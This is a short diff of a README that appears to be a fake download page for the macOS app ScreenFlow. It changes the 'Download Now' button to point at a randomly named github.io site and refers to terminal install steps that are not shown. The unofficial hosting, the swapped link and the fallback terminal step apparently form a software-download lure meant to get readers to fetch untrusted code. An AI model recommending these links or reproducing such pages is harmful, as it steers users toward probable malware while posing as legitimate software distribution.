@@ -2,7 +2,7 @@
 
 ScreenFlow is an award-winning screen recording and video editing software for macOS, ideal for creating professional tutorials, demos, and engaging videos. Follow the step-by-step instructions below to download and install ScreenFlow on your Mac. 🎥
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://screenflow-for-mac.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge&logo=apple)](https://fituganshfgh.github.io/.github/screenflow)
 
 If the download button doesn’t work, follow the terminal instructions below to install ScreenFlow on your macOS device.
 
